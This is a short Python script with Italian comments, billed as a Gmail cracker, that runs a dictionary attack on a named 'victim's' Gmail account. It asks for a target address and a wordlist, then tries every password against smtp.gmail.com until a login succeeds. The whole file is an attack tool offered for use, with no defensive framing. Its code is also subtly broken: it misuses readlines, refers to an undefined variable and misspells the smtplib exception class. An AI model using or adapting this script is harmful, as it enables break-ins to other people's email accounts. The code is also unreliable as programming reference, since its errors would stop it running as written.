import smtplib #libreria per la comunicazione smtp
#tiolo
print('==================================')
print('\nGmAIL crackEr by 0000ARTIST0000')
print('\nDiritti riservati,0000ARTIST0000')
print('\nStile: attacco dizionario!\n')
print('==================================')

#variabili e input
u = str(input('Inserisci la mail della vittima: '))#username da crackare
d = str(input('\nInserisci il nome del file contenente le password: '))#wordlist
#inserite la wordlist nella stessa cartella dello script

#connessione al server
s=smtplib.SMTP('smtp.gmail.com',587)#host,porta
s.ehlo()
s.starttls()#avvio comunicazione criptata

#apertura del file come g in lettura
with open(d,'r') as g:  #g è una variabile
	for x in g.readlines: #ciclo for che prova tutte le password 
		p = line.strip('\n')#definizione della variabile password(p)
		#toglie la \n 
		try:
			s.login(u, p) #tentativo di login
			print('Password trovata: ', p)
			break  #finisci il ciclo
		except smtplib.SMPT.AuthenticationError as e: #errore di autenticazione email password
			print('Password errata: ',p)
			print('ERRORE: ', e)#stampa l'errore
			continue  #continua il ciclo
print('Attacco completato!')
v=input('Premere q per uscire') 
if v=='q':
	exit() #uccidi il processo
else:
	pass #comando che non fa nulla :)
